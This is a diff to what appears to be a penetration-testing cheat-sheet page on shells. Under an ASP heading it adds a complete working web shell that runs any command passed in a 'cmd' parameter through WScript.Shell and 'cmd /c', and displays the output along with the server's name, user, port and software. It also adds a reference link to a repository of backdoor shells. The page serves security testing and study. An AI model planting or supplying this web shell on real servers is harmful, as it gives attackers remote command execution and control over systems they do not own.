@@ -195,6 +195,46 @@ xhost +&lt;target_IP&gt;
 <h3>ASP</h3>
 
 <div class="highlight"><pre class="highlight plaintext"><code>&lt;% eval request("cmd") %&gt;
+</code></pre></div><div class="highlight"><pre class="highlight plaintext"><code>&lt;%
+Set oScript = Server.CreateObject("WSCRIPT.SHELL")
+Set oScriptNet = Server.CreateObject("WSCRIPT.NETWORK")
+Set oFileSys = Server.CreateObject("Scripting.FileSystemObject")
+Function getCommandOutput(theCommand)
+    Dim objShell, objCmdExec
+    Set objShell = CreateObject("WScript.Shell")
+    Set objCmdExec = objshell.exec(thecommand)
+    getCommandOutput = objCmdExec.StdOut.ReadAll
+end Function
+%&gt;
+
+
+&lt;HTML&gt;
+&lt;BODY&gt;
+&lt;FORM action="" method="GET"&gt;
+&lt;input type="text" name="cmd" size=45 value="&lt;%= szCMD %&gt;"&gt;
+&lt;input type="submit" value="Run"&gt;
+&lt;/FORM&gt;
+&lt;PRE&gt;
+&lt;%= "\\" &amp; oScriptNet.ComputerName &amp; "\" &amp; oScriptNet.UserName %&gt;
+&lt;%Response.Write(Request.ServerVariables("server_name"))%&gt;
+&lt;p&gt;
+&lt;b&gt;The server's port:&lt;/b&gt;
+&lt;%Response.Write(Request.ServerVariables("server_port"))%&gt;
+&lt;/p&gt;
+&lt;p&gt;
+&lt;b&gt;The server's software:&lt;/b&gt;
+&lt;%Response.Write(Request.ServerVariables("server_software"))%&gt;
+&lt;/p&gt;
+&lt;p&gt;
+&lt;b&gt;The server's software:&lt;/b&gt;
+&lt;%Response.Write(Request.ServerVariables("LOCAL_ADDR"))%&gt;
+&lt;% szCMD = request("cmd")
+thisDir = getCommandOutput("cmd /c" &amp; szCMD)
+Response.Write(thisDir)%&gt;
+&lt;/p&gt;
+&lt;br&gt;
+&lt;/BODY&gt;
+&lt;/HTML&gt;
 </code></pre></div>
 
 <h2>References</h2>
@@ -202,6 +242,7 @@ xhost +&lt;target_IP&gt;
 <ul>
 <li><a href="https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet" rel="nofollow">https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet</a></li>
 <li><a href="https://www.revshells.com/" rel="nofollow">https://www.revshells.com/</a></li>
+<li><a href="https://raw.githubusercontent.com/backdoorhub/shell-backdoor-list/master/shell/asp/newaspcmd.asp" rel="nofollow">https://raw.githubusercontent.com/backdoorhub/shell-backdoor-list/master/shell/asp/newaspcmd.asp</a></li>
 </ul>
 
     </main>
